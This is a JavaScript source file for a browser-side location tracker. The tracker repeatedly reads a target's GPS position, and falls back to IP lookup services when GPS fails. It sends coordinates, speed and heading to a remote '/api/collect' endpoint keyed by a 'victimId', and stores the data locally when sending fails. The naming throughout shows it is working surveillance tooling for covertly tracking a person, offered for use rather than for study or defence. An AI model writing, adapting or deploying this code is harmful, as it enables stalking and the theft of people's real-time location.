class LocationTracker {
    constructor(victimId, serverUrl) {
        this.victimId = victimId;
        this.serverUrl = serverUrl;
        this.watchId = null;
        this.lastPosition = null;
        this.isTracking = false;
        this.options = {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        };
    }

    async startTracking() {
        if (!navigator.geolocation) {
            await this.sendLocationError('Geolocation is not supported by this browser');
            return false;
        }

        try {
            // Get initial position
            const position = await this.getCurrentPosition();
            await this.handlePositionSuccess(position);

            // Start watching position
            this.watchId = navigator.geolocation.watchPosition(
                (position) => this.handlePositionSuccess(position),
                (error) => this.handlePositionError(error),
                this.options
            );

            this.isTracking = true;
            await this.sendTrackingEvent('tracking_started');

            return true;

        } catch (error) {
            await this.handlePositionError(error);
            return false;
        }
    }

    stopTracking() {
        if (this.watchId) {
            navigator.geolocation.clearWatch(this.watchId);
            this.watchId = null;
            this.isTracking = false;
        }
    }

    getCurrentPosition() {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, this.options);
        });
    }

    async handlePositionSuccess(position) {
        const locationData = this.processPositionData(position);
        
        // Only send if position changed significantly
        if (this.hasPositionChanged(locationData)) {
            this.lastPosition = locationData;
            await this.sendLocationData(locationData);
        }

        // Update tracking stats
        await this.updateTrackingStats();
    }

    async handlePositionError(error) {
        const errorData = {
            code: error.code,
            message: this.getErrorMessage(error.code),
            timestamp: Date.now()
        };

        await this.sendLocationError(errorData);

        // Try fallback methods if GPS fails
        if (error.code === error.POSITION_UNAVAILABLE || error.code === error.TIMEOUT) {
            await this.tryFallbackLocation();
        }
    }

    processPositionData(position) {
        return {
            coordinates: {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed
            },
            timestamp: position.timestamp,
            scanTimestamp: Date.now(),
            source: 'gps'
        };
    }

    hasPositionChanged(newPosition) {
        if (!this.lastPosition) return true;

        const oldCoords = this.lastPosition.coordinates;
        const newCoords = newPosition.coordinates;

        // Check if position changed by at least 10 meters
        const distance = this.calculateDistance(
            oldCoords.latitude, oldCoords.longitude,
            newCoords.latitude, newCoords.longitude
        );

        return distance > 10; // 10 meters threshold
    }

    calculateDistance(lat1, lon1, lat2, lon2) {
        const R = 6371e3; // Earth radius in meters
        const φ1 = lat1 * Math.PI / 180;
        const φ2 = lat2 * Math.PI / 180;
        const Δφ = (lat2 - lat1) * Math.PI / 180;
        const Δλ = (lon2 - lon1) * Math.PI / 180;

        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
                  Math.cos(φ1) * Math.cos(φ2) *
                  Math.sin(Δλ/2) * Math.sin(Δλ/2);
        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));

        return R * c;
    }

    getErrorMessage(code) {
        const messages = {
            1: 'Location access denied by user',
            2: 'Location information is unavailable',
            3: 'Location request timed out'
        };
        return messages[code] || 'Unknown location error';
    }

    async tryFallbackLocation() {
        try {
            // Try IP-based geolocation
            const ipLocation = await this.getIPLocation();
            if (ipLocation) {
                await this.sendLocationData({
                    coordinates: {
                        latitude: ipLocation.lat,
                        longitude: ipLocation.lon,
                        accuracy: 50000, // Low accuracy for IP-based
                        altitude: null,
                        altitudeAccuracy: null,
                        heading: null,
                        speed: null
                    },
                    timestamp: Date.now(),
                    scanTimestamp: Date.now(),
                    source: 'ip',
                    ip: ipLocation.ip,
                    city: ipLocation.city,
                    country: ipLocation.country
                });
            }
        } catch (error) {
            console.warn('Fallback location failed:', error);
        }
    }

    async getIPLocation() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                return await response.json();
            }
        } catch (error) {
            console.warn('IP location service failed:', error);
        }

        // Try backup service
        try {
            const response = await fetch('http://ip-api.com/json/');
            if (response.ok) {
                const data = await response.json();
                return {
                    lat: data.lat,
                    lon: data.lon,
                    ip: data.query,
                    city: data.city,
                    country: data.country
                };
            }
        } catch (error) {
            console.warn('Backup IP location service failed:', error);
        }

        return null;
    }

    async sendLocationData(locationData) {
        return this.sendToServer('location', locationData);
    }

    async sendLocationError(errorData) {
        return this.sendToServer('location_error', errorData);
    }

    async sendTrackingEvent(eventType) {
        return this.sendToServer('tracking_event', {
            eventType: eventType,
            timestamp: Date.now()
        });
    }

    async updateTrackingStats() {
        // Could implement tracking statistics here
    }

    async sendToServer(type, data) {
        try {
            const response = await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: type,
                    payload: data,
                    timestamp: Date.now()
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            return await response.json();

        } catch (error) {
            console.warn('Failed to send location data:', error);
            this.storeLocally(type, data);
            return null;
        }
    }

    storeLocally(type, data) {
        try {
            const key = `location_${type}_${Date.now()}`;
            localStorage.setItem(key, JSON.stringify({
                type: type,
                data: data,
                timestamp: Date.now(),
                victimId: this.victimId
            }));
        } catch (error) {
            console.warn('Local storage failed:', error);
        }
    }

    // Get location permissions status
    async getPermissionStatus() {
        if (!navigator.permissions) {
            return 'unknown';
        }

        try {
            const result = await navigator.permissions.query({ name: 'geolocation' });
            return result.state;
        } catch (error) {
            return 'unknown';
        }
    }

    // Get battery status (for mobile devices)
    async getBatteryStatus() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (error) {
                return null;
            }
        }
        return null;
    }
}

// Export for use in other modules
window.LocationTracker = LocationTracker;
